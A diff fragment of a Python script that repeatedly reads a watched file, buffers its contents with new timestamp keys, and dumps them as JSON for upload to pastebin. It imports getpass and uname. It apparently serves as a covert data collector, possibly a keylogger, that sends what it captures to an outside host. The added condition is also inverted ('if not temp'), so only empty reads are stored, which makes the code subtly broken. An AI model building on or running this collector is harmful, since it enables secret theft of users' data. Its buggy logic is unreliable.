@@ -11,9 +11,13 @@ from os.path import exists
 from os import uname
 import getpass
 import pastebin
-import datetime
+from datetime import datetime
 from time import sleep
 import json  
+
+def get_timestamp_str():
+    now = datetime.now()
+    return now.strftime("%m/%d/%Y, %H:%M:%S") 
 
 
 # Define API & connect to pastebin
@@ -55,7 +59,9 @@ def fill_buffer_upload(myInode, uploadInterval):
     while exists(myInode):
         print('inside exis')
         sleep(uploadInterval)
-        bufferToUp[ct]= f.read()
+        temp = f.read()
+        if not temp:
+            bufferToUp[get_timestamp_str()]= temp
         print(bufferToUp)
         if(sys.getsizeof(bufferToUp)>1000):
             data = json.dumps(bufferToUp)
